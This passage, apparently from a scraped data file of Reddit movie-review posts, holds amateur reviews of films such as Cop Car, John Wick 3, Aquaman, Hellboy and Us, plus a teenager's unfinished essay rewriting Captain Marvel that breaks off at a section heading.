1568539166.0,Movie Review : Cop Car,"Cop Car, directed by Jon Watts, starring Kevin Bacon, James Fredson- Jackson, and Lloys Wellford. This is a great movie, I had fun watching . The movie has a very indie feel to it. Its shot beautifully, in mostly one area, just lonely stretches of roads, vast and wide empty fields. Just picture the middle of nowhere, rural america, different shades of brown, that's what the setting is like. It almost gives you serene feeling, very quiet looking, minimal. Then shit hits the fan and you ask yourself how can a bunch of bad shit happen in such a quiet part of town. Anyways, Kevin Bacon does a great job. I don't think I've seem him in a role quite like this. He's such a great actor. Also the 2 child actors do a wonderful job as well. They really made you feel like they were just 2 friends getting into some shit they had no business being in. They were very believable. The only thing I had a problem with were a few scenes where the kids were driving. There is no way I am going to believe that 2 kids no older than 11 I think, can drive a car full speed almost perfectly without an accident happening, let alone them reaching the damn pedals while sitting flush in the drivers seat. Overall, I had a good time with the movie.


7/10. 👌🏾. Would Watch Again!





You can find the movie on Netflix, it's not one of them movies that Netflix is shoving in peoples faces recommending it everywhere to everyone. It's one of those movies that you have to dig and search for it. The way I found out about the movie was through Flick Connection and a video he did where he is recommending hidden gems on Netflix and Cop Car was one of his recommendations. If it wasn't for that, I don't think I ever would of come across this movie otherwise.",moviereviews,1741,327,50,0

1562252244.0,Saw Spider Man Far From Home (Tuesday),"My nephew and I caught an 11pm showing of Far From Home. Much like the first Spidey movie with the new kid on the block as Spide (Tom Holland) I think Ill have to watch Far From Home a few more times to appreciate it enough to add it to my blueray collection. 

The first time I saw Home Coming I didnt like it. I watched it a few more times and now I like it- I do that sometimes, draw an opinion on a thing or person hastily. You have to appreciate the sheer acting chops brought to the stage by Holland and my man Keaton- they really carried the movie, seeing them together in most the scenes was a treat. 

Although Gylenhaal is no slouch, hes no Keaton but he did do a great job and he looked great but Ill say it- I think he was miscasted here in Far From Home as Mysterio. The problem is hes to good to be so disposable. I would've love to see him be permanent fixture in these movies like maybe a love interest for aunt May, or maybe he couldve been Dr. Curt Connors (the Lizard) so that we'd see him more often throughout these movies.. 

Spider Man Far From Home was okay, I think my nephew gave it a 7 or 8 outta 10, I gave it a 5. I like Spider Man but I cant say that I have ever been a Spider Man fan. I think those first three Spider Man movies had much more to offer than what we have now. The material in those older movies was more solid, gritty and real- you could be an adult and enjoy those movies whereas these new movies seem to be for older men who haven't grown up yet. If you remove all of the CGI from both movie franchises what would you have? The first Spider Man movies would still be interesting but these new ones would suffer greatly. That first Spider Man movie with Tobey Maguire (2002) reminded me of that first Batman movie by Nolan- Spidey and Batman struggling to live with Petter Parker and Bruce Wayne. Those movies compelled you to focus on how real the people were. 

These newer movies... I dont honestly think teenagers like these movies, most of us like these movies because really, what choice do we have? I really just dont believe these movies... That used to be the purpose of a movie, like Indiana Jones- when we watched Indiana Jones as children the real world outside of the threather cease to exist. Now a days you watch these movies and you are constantly reminded that you are watching a movie. These movies dont sneak up on you, from the beginning til the end youre bombarded with fiction- blatant fiction. That first Batman movie by Nolan wasn't like that at all. That shit was real. That shit had me thinking quietly about my life and some of the decision Ive made as I walked out the threater. These movies now a days are worse than comic books- a comic book give you information, these movies tel you what you should know- those are not the same. I dont wanna hear exposition, I wanna see action. These MCU movies dont think highly of us as movie watchers- these movies are very loosely put together. They dont invest a lot of foresight into these movies. The aren't laying in groundwork into these movies, not in a stylish, sophisticated way, no but in a ""breadcrumbs"" and overly obvious way that likes polish and refinement. These MCU movies dot every I and cross every T for you as if youre reading on a third grade level.. I wish they would give us SOMETHING to figure out on our own. 

So what did I think of the movie? I think it was bubblegum, at first its pretty and sweet but after a while of chewing, the sweetness is gone youre left with a wond of tasteless gum in your mouth but you keep chewing cause thats what we do with MCU movies. 

Really, to tell the truth, Im waiting for something else. The MCU has to show me something spectacular soon or Im giving up on their comic book movies- I wanna see death. I wanna see grit. I wanna be afraid again. Really only reason I watch these MCU movies now is because they are all connected. 

If they hire Nolan to make an X Men movie.. Man oh man.",moviereviews,3965,758,76,0

1560043992.0,John Wick 3 Review! Guns... Lots of guns....,"Keanu Reeves still has yet to stop amazing me! He has once again shown that he gives 100% to the most physical performance of his career since The Matrix. John Wick, imo, is the best thing to happen to his career entirely! NOBODY can replace Reeves as Wick, because Keanu Reeves is John Wick and John Wick is Keanu Reeves!

John Wick 3 for the third time in a row has nailed its unique gritty yet flashy fighting style, gun fu, beautiful camera work, amazing stunt work, beautiful cinematography, overall amazing visual and coloring, and IMMERSIVE fight sequences, and believe me, there are A BUNCH of them..... Usually in fight scenes, a fight is at least 2 minutes long, but almost every fight scene is several minutes long, and that is not something easy to pull off without being boring! There is not once frame of boredom in this movie, especially in the fight scenes, whether it be hand-to-hand or gun fighting. John Wick does a lot of different things in this movie that he has not done in the past movie, and one thing I really like about this movie is that it shows that he is still a human being, he is no super human, he is just a flesh and blood human mortal under that suit filled with bullet resistant armor. He does get wrecked quite a bit in this movie, allowing the audience to get that feeling that he really is in danger and can be beaten down.

During this movie, there is a lot of subtle comedy spread throughout, specially in fight scenes, and I really felt that was a nice touch and fit, to add more uniqueness to this movie. Mark Dacascos also does GREAT in this. He is also unexpectedly goofy in this movie as well, but is did work VERY well!

Halle Berry makes an appearance in this movie, that is rather a small part, still makes her time on screen TOTALLY worth it.... She shows that she went through similar training that Keanu did for these movies and she really kills it, along with her two dogs!

While this movie continues to amaze with Keanu's performace and complete commitment to John Wick, the story is, while not bad, it is not entirely in your face, like parts 1 and 2 were. Yes, the premise is there and is well executed, John has to survive his excommunicado after spilling blood in the Continental hotel in part 2, there is more to the story that I feel should have had more oomph to it, more energy. The story is there, just doesn't feel as strong as parts 1 and 2. And the conclusion to this movie is, while not bad or awful, is nowhere near as good or badass as the conclusion in part 2, with John running away with his dog. There are also some scenes, while not boring, at the same time, feel a bit fuller. They are clearly part of the story, but while these scenes are happening, they feel dialed down, and how the scenes are executed, not the right feel for this movie. Thankfully, Reeves' performance makes up for it!

This is more of a nitpick, but Common is not in this. He is nowhere at all in this movie and that is kind of a bummer. He felt like an important character in part 2, and was nonexistent in part 3. Also, John Leguizamo isn't in this either. Neither is Jimmy. Would have been nice if these guys had involvement in this movie somehow.

Overall: 8.5/10. While not as strong as the first two, story-wise, John Wick 3 continues to impress with very much so everything else! The audience will be very immersed with this one! Hopefully part 2 will be an immersion as well!",moviereviews,3432,638,97,0

1559388757.0,[SPOILERS] Aquaman was better than I thought!,"So, I have watched Aquaman and I am ashamed that I almost didn't! I almost decided not to because I really hated Batman vs Superman with a passion.... AQUAMAN WAS PRETTY DANG GOOD!!!! I really hope that Aquaman 2 happens!

A lot of people on a different thread of mine said that Aquaman was crap and all that... WERE WE WATCHING THE SAME MOVIE???!!!! It is the best DCEU movie since Wonder Woman. Officially a fan of Aquaman now! Did not expect the badassery in this! One of the best parts of the movie is Black Manta jumping Arthur and Mera in that small town they were in... My gosh, what an immersion!!!! The camera work, the visuals, the sfx, the fight choreography, JAMES WAN is brilliant!!!! He knows his superhero movies and his horror films XD Good stuff!!!! Black Manta turned out to be a really cool character! I thought he was only the movie opener but I was very wrong.

Patrick Wilson as Ocean Master... Wow... What a performance! He is not exactly known for these kinds of movies and he really owned his role! Reminded me of Loki. He was not even corny at all! Just right! Dolph Lundgren was also really good in this movie too! He's known for his tough guy brute characters, but I really bought his performance in this.

Amber Heard was also great in this. Thankfully her performance didn't suck in this and she really had some shining moments in this, especially the wine scene..... I say ""thankfully"" because I know about her irl status... At least I think it's true. Cannot picture Depp being a beater. Just cannot do it. 

The visual effects were absolutely beautiful..... I mean, they even handled everybody being all floaty underwater VERY well, I mean the hair, clothing, jewelry, the detail is stunning, from big and small! I was happy that I was able to take even actors who are known for brutal edgy roles seriously, like Lundgred, Dafoe, Momoa....yes I remember him very well for Khal Dragon.

Everything was just done VERY well.... Any flaw that I may have noticed was very small. I noticed how in a flashback, Vulko was talking to a teenage Aquaman during pitchfork training about his mother being killed, I could tell Vulko was lying, they never touched back on that later in the film, when Aquaman's mother returns.... I also noticed that the teen's acting was not very wonderful. Wasn't horrible, but he did not put enough emotion into it.

Another thing, as the movie was coming to a close, I was afraid that Black Manta's storyline wasn't gonna be revisited in the movie and was very disappointed when the movie ended, then the credits happened. I take it Manta will be the villain in part 2! That was a neat storyline. I would have preferred Manta's story be revisited during the film, but I guess it would have been too much.

I was VERY impressed with how they handled the plot structure! They handled the Ocean Master storyline and Manta's very well, by having them connect in a particular way, and it was very good! 

One more thing, I am happy that I totally bought Aquaman and Mera's relationship in the movie. They played off each other VERY well and it all totally worked. They had wonderful chemistry! Mera's character was great! I really liked her place in the movie. 

I seriously hate that this and the WW franchise are part of the DCEU because they are too good for that weak universe.... They should be licensed elsewhere, however that works. 

One thing that reminded me of my enjoyment is how fast it went by. By the time I had paused to do something, it was already an hour in and it kinda felt like ten minutes! 

Overall: 9.5/10. A very watery, wonderful ride that really kept everything in check and was brilliantly paced and consistent, minus a couple of small errors that are totally forgettable. The role of Aquaman totally belongs to Momoa and him alone. One of my favorite more lighthearted superhero films. I gotta see more!",moviereviews,3883,691,160,0

[ ](

So, what is it about this movie that makes it so bad? Is it it’s length? It is very long but that isn’t normally a problem for me.

It *feels* long and there is a big difference between *feeling* long and being long. This means that the moving is either boring or the pacing is way off. Bicentennial Man checks both of these boxes.

As anyone who knows me will understand and have heard me say many times *story is everything*. This movie does not have a story, well not really. It has a theme that is addressed overtly throughout the course of the movie, which is never a good thing. So, the story sort of just circles around the theme.

### What is the Theme and Who Cares?

The story should interrogate the theme. The story should make us have an opinion about the theme. This movie fails here. Because of this, everyone leaving the cinema after watching this could have told you what the theme was but I highly doubt that they would have cared very much about it. 

### Would Asimov Think it's Bad?

So, I haven’t read the book by Asimov on which this is based but from what I have read of his I doubt it would have been as boring and narrative free as this film.

### Was it Love?

Another huge flaw is that because Andrew is essentially immortal we go through multiple generations of humans. This makes it very difficult for any meaningful relationships to be built. This makes the shoehorned love story feel even more contrived than it already does.

There are many other, less annoying issues with this film, such as the question of who this film was targeted at? A lot of the humour is soft and twee which makes it feel like it is targeted at children. The theme about what it means to be human is not a theme for an audience of children.

Also, the film was set in 2005. So where are my androids?",moviereviews,1822,342,37,0

1557508240.0,Death File: Black (review),"This one starts out pretty strong with some pretty grisly stuff, the first scene, or ""file"", is of some dudes who were apparently  assassinated. this isn't too graphic, but then we move on to a suicide aftermath where the man used a pistol to blow his brains out, this also isn't that graphic, surprisingly. the most gruesome footage in the entire video comes next, where we see the aftermath of a fatal bus crash. the victims' bodies are still trapped in the bus and they're horribly mangled and mutilated. next it's on to Thailand where we see some very tame documentary footage of locals killing and cooking various small animals (frogs, bats, rats, a monitor lizard). from this scene on, this becomes more like a traditional mondo movie rather than a 90s death video. we see some deformed fetuses preserved in formaldyhide, some sort of penis surgery  (where we don't see much at all), a segment on transgender women, a woman getting a boob job, etc. then there's some footage from Haiti that manages to not really show anything interesting, other than some titties. from here we move on to the Fillipina Festival of the Ressurection  where we see men flogging themselves until they're bloody and then a reenactment of the crucifixion of Christ, complete with men having their hands nailed into the cross. after this we saw a quick montage of some (not graphic at all) war footage and then our host shows up and gives us an outro that I obviously can't understand since it's in Japanese. this one is definitely one of the tamest ""death films"" I've seen. while there is some gory footage in the first 15 minutes, from there on it basically becomes a 1960s mondo movie with nothing that would really shock or disturb anyone who's ever seen one of those aforementioned mondo movies. while some of the footage is interesting, this one definitely won't be of much interest to gorehounds as there's really only one standout gore scene (the bus crash) and the rest is pretty tame as far as these kind of videos go. this is all hosted by a professional looking man in a suit who sits at a desk where you can see some original Death File VHS tapes from the same company that produced this one. this one runs only 59 minutes and while it never gets really boring, some of the footage does go on too long without really showing anything interesting. overall I give Death File: Black a 3/5. just don't go into it expecting the  wall-to-wall carnage that many similar titles offer. the copy I saw was in Japanese with Portuguese subtitles so I couldn't understand any of the narration but it's not really important as the images speak for themselves for the most part.",moviereviews,2659,469,60,0
1555493196.0,Hellboy (2019) - SPOILER-FREE Review,"If you enjoy reading my Spoiler-Free reviews, please follow my blog @ [MSB Reviews](



*Guillermo del Toro*‘s pair of ***Hellboy*** movies were always pretty acclaimed by both critics and audience. So, if a reboot was in the works, it had to be way different from the originals or, at least, capable of separating itself from them. *Neil Marshall*‘s film is definitely distinct, but not in a good way. Sadly, this is one of the worst movies of the year, so far. *David Harbour* tries super hard to bring this story to safe haven, but his outstanding performance can’t fight back all of the painfully long and repetitive exposition dumps, an editing worthy of a Razzie Award (if they had such a category), and cringe-worthy comedy bits.

The trio of writers failed in almost everything. Even **Hellboy**, as a character, becomes a caricature of himself at one point. *Milla Jovovich*, who is not a bad actress at all, offers such an over-the-top display that only comes off as cliche, cheesy, and the complete opposite of menacing. Obviously, her extremely villainous script doesn’t help. *Sasha Lane* (**Alice**) is the only one who actually portrays a likable character (excluding the protagonist) and delivers a compelling performance. *Daniel Dae Kim* is also good as **Ben Daimio**. Unfortunately, a talented cast is not enough to overcome the undeniable screenplay issues, which tells a convoluted story, filled with heavy exposition through annoying flashbacks (I lost count of how many there are).

The rock’n’roll score doesn’t always work, becoming uneven and making some transitions just weird. However, credit where credit is due, it does make the action sequences a lot cooler. There are some great action moments where **Hellboy** shines, but overall they are ruined by sloppy editing. Honestly, I don’t know how *Marshall* can direct such beautiful one-take fights (or “stitched one-take” sequences, like one towards the end) and horribly edited ones in the same film, so many times. The visual effects disappoint as much as they impress, but **Hellboy**‘s makeup and costume are, at least, on-point. In the end, the story and the characters are the two pillars of any movie, and ***Hellboy*** fails to deliver a well-written and captivating adventure, as well as compelling characters.



All in all, ***Hellboy*** is a huge misstep in *Neil Marshall*‘s filmmaking career and he’s going to have to work hard to get another opportunity at a blockbuster. His film is already suffering losses at the box-office, which proves that the interest in the reboot of this franchise is not big enough to warrant a sequel. Admittedly, it has its good moments and *David Harbour* embodies his character seamlessly, carrying the movie for as long as he can. Nevertheless, a good cast and some occasionally cool action sequences are not enough to fight back writing issues, uneven soundtrack, cheesy comedy, heavy exposition dumps, and the worst editing I’ve witnessed this year, so far. It’s a headache that most people might not find worthy of the price of admission…

First of all, you can read my review of one of my favorite movies of 2017, *Jordan Peele*‘s [***Get Out***]( by clicking its title. One of the best feature-long debuts of all-time by a writer-director who I wish he discovered his filmmaker skills sooner because the horror genre urgently needed someone like him. *Peele* is starting to become one of Hollywood’s most notable people, and he proves once again, now with ***Us***, that his undeniable talent is going to leave our jaws dropped and our minds confused for quite some years. While I do think that his first film is more consistent and better structured, ***Us*** is so far the best movie of the year, and I doubt that it will stop being part of that list by the end of it.

The best films are the ones that can transform a 45-min car ride back home from the theater into a blink of an eye. I spent all that time plus some more minutes discussing and arguing with my partner who I saw the movie with. By now, I have a pretty decent understanding of the film’s story and of *Lupita*‘s character arc, which will definitely leave you extremely confused and mind-blown by the end of the movie. However, I will see it a second time to make sure my “theory” aligns with everything else, especially those tiny little details we don’t really think they matter when they actually do.

*Peele*‘s screenplay is thought-provoking and suspenseful, filled with brilliant character development, and surprisingly well-filmed action scenes. I guess he knows how to do anything efficiently. The chasing scenes are riveting, and the fights are bloody awesome. In addition to this, most of the action occurs at night which requires the director to know what he’s doing, so the audience is able to follow what’s happening. I never, not once, lost my place during an action sequence. I knew who everyone was, where were they at, and what were they doing. Nowadays, having in mind how actual action blockbusters are being made, this is the best praise I can give a director regarding these type of scenes.

A lot of articles are calling *Jordan Peele* the “next *Spielberg*“ or “new *Hitchcock*“. I’m calling him the first *Jordan Peele*! I would have loved to be the one who came up with this last sentence, but I wasn’t … and I’m so happy about it. It means that more people are starting to plant into their minds that *Peele* is one of a kind, not one like the other. His trademark close-up shots right in the actors’ faces can show and tell so much about a character. Besides that, the actors will have a golden opportunity to show their enormous emotional range, their incredible expressions, their limitless talent … That is if you are someone like *Lupita Nyong’o*.

Right after I watched [***Alita: Battle Angel***]( I called that it would get an Oscar nomination for Best Visuals Effects, and I still stand by it. Well, I also want to be the first to call not only an Oscar nom, but a Best Actress win for *Lupita*. *Daniel Kaluuya* was outstanding in ***Get Out***, but *Lupita* surpasses his fellow comrade with two (!) powerfully captivating performances. As the original mother, she shows kindness and endearing traits. As her doppelganger, she’s scary, menacing, and evil. Two completely different characters with distinct physical and psychological characteristics are no problem for *Lupita*. She handles them in such a flawless and effortless manner, carrying the entire narrative on her shoulders like it was nothing. She deserves every recognition there is.

Nonetheless, she still received great help from the remaining cast. *Winston Duke* (**Gabe Wilson**) is hilarious, and he’s the primary source of comedy throughout the film. With a remarkable balance of tones, *Peele* lets *Duke* shine in a role that he thrives on. ***Us*** can be very heavy and dark at times, so a good laugh here and there is always welcome. The young actors are also great, but I have to congratulate *Shahadi Wright Joseph*‘s performance as **Zora Wilson**. She has approximately the same age *Amandla Stenberg* had in ***The Hunger Games***. At the time, I knew *Stenberg* would be an outstanding actress, and I was not wrong. Now, I’m 100% certain that *Shahadi* will be an exceptional one if she isn’t already.

&#x200B;



Technically, I already wrote above how talented *Peele* is. From his seamless ability to film action sequences in the dark to his brilliantly-written screenplay, he nails almost every aspect of his movie. The score beautifully accompanies the narrative with cool, rhythmic songs when everything seems fine, and with loud, angelically weird voices that instantly change the tone. Flawless editing helps hide some nitpicks I have with some exposition scenes, especially towards the end. While I understand that the story has a lot to take in once “explained”, I believe *Peele* does so in a slightly too fast monologue that I think some people won’t quite enjoy. For me, I would have loved total ambiguity. If they didn’t explain a thing, I would have been ecstatic, but I understand the need to do it.

My other gripe with the film is the other family, portrayed mainly by the always astonishing *Elizabeth Moss* (**Kitty Tyler**), and *Tim Heidecker* (**Josh Tyler**). Thinking about them and their importance to the story, I find that either they could have been better utilized or they shouldn’t even exist. It’s the middle ground between these two options that bothers me a little since it feels like these two remarkable actors, especially *Moss*, were left aside too much. They are indeed relevant to elevate the story as a whole, but I still wish they were explored a bit better.

Sadly, I think audiences will like ***Get Out*** more, even though ***Us*** has more of the horror genre’s traits than the first. Not only due to the story being more comfortable to follow and ultimately understand (some people actually left my theater way before the end … shame on you!), but also because it has a definite ending. Unfortunately, people don’t really like to think about a movie after it finished, so if it has some sort of open-ending, they’re going to be mad. That’s what happens if you go into ***Us*** expecting a cheap horror film, filled with cliche jump scares, and hollow characters. This is not a scary flick. It is a horror movie, and a phenomenal one. In case you want a simple, spoiler-free advice on how to approach the film’s story, I’ll leave just one small sentence after my rating.

&#x200B;



*Jordan Peele* is one of a kind. He is not like anyone else. Once again, he offers a thought-provoking, deeply layered, and incredibly suspenseful narrative. Captivating and entertaining from beginning to end, with no misstep along the way. Technically seamless, with his emotionally-driven trademark close-ups on the characters faces being a standout. *Lupita Nyong’o* delivers what I believe it’s her career-best performance(s), which should grab her not only a bunch of award nominations, but wins as well. Brilliant cast, tonally well-balanced with hilarious comedy, and filled with excitingly scary action sequences.

***Us*** does not have a single interpretation. My perspective is not right or wrong, it’s just my point of view. It’s one of those movies you can watch time and time again, and each viewing will give you another insight that you missed before. However, I do think that what happens at the very end, it’s true, and I have more than enough hints throughout the film to sustain my opinion. Despite some minor issues/nitpicks, it’s undoubtedly the best movie of 2019 so far, and I highly doubt it will be out of my Top10 by the end of the year. Thank you, *Peele*, not only for giving us great horror films, but for being yourself. Go see it!

1552368343.0,Captain Marvel Review and Edits (SPOILERS),"
General Thoughts and Impressions

New Criticism is… new. I haven’t had the chance to talk to many people about it, but as far as I can tell, it isn’t very wildly popular. New Criticism differentiates heavily from older criticisms. While many older criticisms would have looked to the author for answers to the story, New Criticism focuses on interpretations-- not what the writer or author or director meant to put out, but what the viewer got from that. To simplify it, my English teacher would tell us a story about a book about a monkey that goes to the zoo called “Monkey Goes to Zoo”. It wasn’t a real book, but just an example. In the book, there were some details that would point to the monkey having abusive parents. People who followed old criticisms would’ve asked the author if the monkey had abusive parents, and the author would say no, and the old critic would have gone with that answer. A new critic would have read the book and then thought of it, not as a story of a monkey going to the zoo, but a monkey escaping from an abusive household. While there are other aspects of New Criticism that I did not bring up (some of which I do not agree with), this is what I think applies to this movie the most. While looking at reviews for Captain Marvel, I saw a lot of hate on the movie, not because of the movie itself, but because of comments Brie Larson made about the movie. While I did not like the movie, I don't think people should dislike it just because of what an actress said. In this essay, I will highlight the main problems I had with the movie itself and try to propose ways in which the movie could have been changed for the better.

As I said, I didn’t like Captain Marvel. I thought a lot of Carol Danvers’ dialogue wasn't well-written, her arch wasn’t shown clearly, and the climax wasn’t very good. However, I didn’t think the movie was bad either. It had very good special effects, an amazing soundtrack, and a great twist (though it could have been emphasized more).

Specific problems

The first problem I had was Carol’s dialogue. This isn’t something that I’ll take the time to fix because it’s too nitpicky, but anytime she tried to make a joke or a witty quip, it always felt like the writers were just throwing “badass” and “humor” into a blender and using whatever came out. I do think that it was a good reflection of her character to use dialogue like that, but it should’ve been written more naturally and less often.

It also seemed like she knew what to say too quickly. Anytime she was cornered or confronted by an enemy, I seemed like she already had what she needed to say written on a notecard. It didn’t feel natural, and that ruined her character for me. This may not be a big problem for other people, but whenever I’m writing, dialogue is a huge deal. I’d say 33%-50% of any given fictional story I write is dialogue, so making things sound natural is so important that when I see dialogue that unnatural, it hurts.

The second problem I had, and this is what I’ll try to fix, is the… the second half of the movie. I wish I could simplify it down to just a few major problems, but I can’t think of how to. Just like dialogue, character development is also big for me, and Carol’s arch was so brushed over, it was practically criminal. We could’ve had a genuinely interesting story of a woman trying to serve justice realizing that she was fighting on the wrong side of it the whole time, but instead, we just got a generic, emotionless story that felt like it was something I’d write if the deadline for it was the next day and I hadn’t started.

And that’s something else I didn’t like either. Carol seemed like a robot with one purpose. While watching the movie, there was no moment where I thought “Oh no, Carol is gonna get hurt or die,” because I didn’t care for her. It wasn’t because there was never a situation in which she could easily be killed, it was because she was so powerful. There were a few minutes near the end when she lost her powers, but she had them back before anybody even got a feeling she could get hurt. And I think the solution to this kind of problem is by showing more of her emotional side. Even if she was all-powerful, if we truly knew her as a human, we would’ve have cared for her so much more. Instead, we watched her throw around Skrulls for an hour like they were action figures and then throw around the Kree for another hour. We needed to know Carol as a human that faced normal, human problems, not just as a god.

Changes in Act 1

Now we’re going to get into the somewhat productive part: fixing the movie. Before I do so, let me make it clear that I am a fifteen-year-old child. I don’t know anything about writing aside from what I’ve learned in English classes and online, and I sure as heck don’t know as much as the writers for this movie. Nothing I could say here would change the quality of the movie, it’s just an exercise to prepare me for future writing.

The first thing I would’ve changed is Carol’s character arch. I think the arch she had in the movie was very good but could’ve been better with better writing. In order to identify Carol’s arch, we need to realize what the goal, the lie, and the truth are (the three major parts of a character arch). So first, let’s figure out what her goal was. There are a few answers you can say here, but I think that the one that is not only the biggest we see, but also the biggest to Carol has to do with serving justice. One of the very first scenes in the movie is her along with her group going to a planet to take down a Skrull infiltration, her view of justice. Here, we see Carol’s goal: to serve justice and protect innocent civilians. At almost the exact same time, if not earlier, we learn the lie: the Skrulls are the bad guys. At the midpoint of the movie, we learn the truth: the Skrulls are just trying to survive. The truth should’ve been a huge revelation to Carol. She had spent every moment of her life that she could remember at that point training and fighting Skrulls. That is equivalent to devoting your ENTIRE life to doing something, only to find out later that what you were doing was actually killing and injuring innocent people. And when she finds out the Skrulls are the good guys, she literally flips faster than a light switch. There is no struggle at all to completely go against what was her home up to that point.

Now that we’ve found Carol’s arch and the problems with it, we can begin to fix the movie. As I mentioned before, I think we should focus on a more human problem Carol faces so that we can more easily relate to h character and emotion, and that problem should also correlate with her character arch. According to a survey published by  the ninth most concerning problem to millennials is safety and security. I think this would be very easy to show in Carol, given that she has no memory of her past, and it corresponds to her arch because while she provides security to the Kree, it would be interesting to see her struggle with her own security and well-being.

The first thing I would change in the movie is much of the opening scene. The dream she has of her past life can stay, but what I want to change is what happens when she wakes up. First, instead of going to Yon-Rogg, she sits up in her bed, in a dark room, in a cold sweat, obviously having shifted around a lot in her sleep. The first thing she does is check the lock on her door, making sure it’s shut. Then she draws some kind of weapon (a gun maybe, it really doesn’t matter) and looks around her room, the music following her movements like a horror movie driving up the paranoia. She then checks the lock on the door a second time and sits in her bed. A second later, there’s a knock at her door, and she hesitantly stands up and walks toward it, holding the weapon behind her back, ready to pull it out and fire it. The music follows her again, just like a horror movie. She opens the door and the tension is relieved when she sees that it’s only Yon-Rogg. He says something about hearing her moving in her room and he asks if it was the dreams again, and she says it was, though in a cockier, funnier way. Yon-Rogg invites her to the fight scene that happened much earlier in the movie, and she tosses the weapon onto her bed as she leaves. I think that this is a necessary change because it emphasizes not only her fear of the Skrulls and not only her fear of her past but just fear in general. One of the most basic fears most humans feel as children is the fear of the dark, which at its roots, is just a fear of the unknown. This is her relation to her human side and to us. She’s scared of what she doesn’t know, making her more likely to believe the lie discussed earlier.

The movie would remain mostly the same for a little bit, except that Carol wouldn't visit the Supreme Intelligence until later. Instead, the Starforce is immediately dispatched to rescue the Kree spy, though their journey takes a day, rather than just a few minutes or hours. We can use this time to explore Carol’s relations with the rest of her team. I don’t have any specifics, just imagine that little conversation they all have when they first get on the ship in the movie but longer. This is just to build up their relationships so it’s harder for the group to fight against Carol in the future, and so that we can find out that everyone is actually a little bit scared of her. In the movie, it seemed like Carol’s powers were much stronger than any other member of her team’s, and that wasn’t touched on at all. So not only is she an outsider to them, but she is also much more powerful than them. I don’t think it would be too unreasonable that Yon-Rogg would tell the group to make her feel welcome so that she wouldn’t try to reach her other life. By protecting her with a shell of lies (the Skrulls are evil and she belongs with the Kree), Yon-Rogg is preventing her from seeking out her old life.
The night that they spend on the ship, Carol wakes up again, freaking out, and scaring everyone else, since they would all be sleeping in the same room. Yon-Rogg ushers her into a separate hallway or area or wherever they can go and that is when he uses those magical, blue, spaghetti-things to hook Carol into the Supreme Intelligence. Now that we have established Carol’s fear of the unknown, if the Supreme Intelligence appears to her as Lawson, a woman she does not know, it would make more sense for her to fear the Supreme Intelligence and disobey what it says. Once Carol is inside the Supreme Intelligence, their conversation is still very similar to the exposition dump we got from it earlier in the original movie. We learn the lie that the Skrulls are evil, we learn that Carol controls her powers using the disc on her neck, and most importantly, we learn that her powers can be taken away. The Supreme Intelligence tells Carol to swallow her emotions, specifically her fear, and continue working for the Kree. Once she leaves the Supreme intelligence, we get the scene where Yon-Rogg explains to the group what their mission is (until this point, we didn’t know they were going after the Skrulls and looking for their spy), and they land on the planet and instead of Carol getting separated, she is with Yon-Rogg when they find the villagers. The villagers are fearful of the Starforce, and some step up to try to defend the rest, confusing Carol. When one gets too close to Yon-Rogg, she shoots at him, injuring him, and revealing he’s a Skrull. This immediately sets off the rest of the crowd, and there is a short fight scene, though longer than the scene in the movie, wherein Starforce is separated. Carol finds the Skrull pretending to be the spy, but is outnumbered and knocked unconscious.

Changes in Act 2

We go through all of the memory stuff, and the Skrulls eventually see the crash where Lawson is dying. Carol has to remember two things from this scene. One, Lawson’s name, and two, that her blood is blue. This will help out later. Carol wakes up, fights the Skrulls, and gets into the escape pod. Instead of going to Earth, though, she talks to Yon-Rogg quickly and returns to Hala. Carol tells Yon-Rogg that the Skrulls are going to C-53 and looking for Lawson, and she wants to go to Earth, partly because of the Skrulls, but also because she now knows that Lawson was a Kree. However, Yon-Rogg immediately shuts down the idea without a reason as to why. Lawson lets her curiosity get the better of her, and goes to Earth anyway.

After that, the movie remains widely the same until the midpoint. While the midpoint may not be the exact center of the story, it is usually near the middle and is what sets the climax in motion. The midpoint in the movie was when Carol learned that the Skrulls were just trying to find a new home. This is the truth. However, I think the story could be made even better if this scene is added onto.

Almost immediately after she learns the truth, the Starforce shows up, and after a long and emotional fight scene between Yon-Rogg and Carol, Yon-Rogg removes the piece from her neck, making her believe she can’t use her powers. She tries to fight him, but as we learned earlier, she can’t beat him in hand-to-hand combat. Yon-Rogg leaves with the Skrulls, and Carol is left behind on Earth, powerless. Because the Skrulls are no longer on Earth, there is no reason to bomb it.

I believe that out of all the changes I have made, this is the most necessary change. As I said before, Carol loses her powers in the movie but regains them almost immediately. I know that a hero losing their powers is a huge cliche, but if you’re going to do it, you might as well do it right. This way, we get to learn about Carol’s human side, and we get to see her deal not only with the revelation that she spent so long fighting on the wrong side, but also that she just lost her powers. We see these two in her dreams overnight. 

Rather than seeing her past, we see her fight with Yon-Rogg. She wakes up in a cold sweat as before, but instead of going around and locking the door, she goes downstairs (she’s staying at Maria’s house) and sits at the table until Maria finds her. She asks if she had the dream again, implying she’s been staying there for a few days, and Carol says yes. She tells Maria that rather than feeling scared, she has a different feeling now. Not fear, not happiness, not sadness, something different. Like she feels weak. Maria tells her that feeling is helplessness. She tells her that she feels it because she lost her powers. But she tells Carol that, while Yon-Rogg has taken away what made her Vers, Carol still has the best parts of herself. She tells Carol, “you still have the bravery that let you climb into the cockpit of some experiment just to save the world. You have the humor that would keep me entertained for hours, and manage to piss off every guy in the bar. You have the resilience to fall flat on your ass and still say, ‘let me try again’. So stop feeling sorry for yourself, and get your ass off the ground.” (I’m kinda proud of that).

Carol and Maria work with Fury and Coulson (who was horribly underused) to create the spaceship-airplane-helicopter thing, which they then use to travel to the coordinates Carol remembered, however, Maria stays on the ground because it makes absolutely no sense for her to abandon her child. They all get onto Lawson’s lab and find the civilization of Skrulls, who are all very fearful of Carol specifically. Carol raises her hands in the air to show them that she means no harm and then explains to them what’s happening. They also find the Tesseract, which they put in the lunchbox. Nick, Coulson, and Goose head back to the ship, only to find the Starforce’s ship.

Carol stays back to discuss getting Talos out of Hala with his wife, which we don’t get to see (I’ll get back to that). Carol is surrounded by the Starforce and unable to fight them off without her powers, though there is an extended fight scene with Yon-Rogg where she almost beats him with her newfound willpower. Before that, Carol told Talos’ wife to get the rest of the Skrulls off the lab with Nick. They all head back to Earth, and when Yon-Rogg sees this, he tells Ronan to bomb C-53, and Ronan sends his ships.

Changes in Act 3

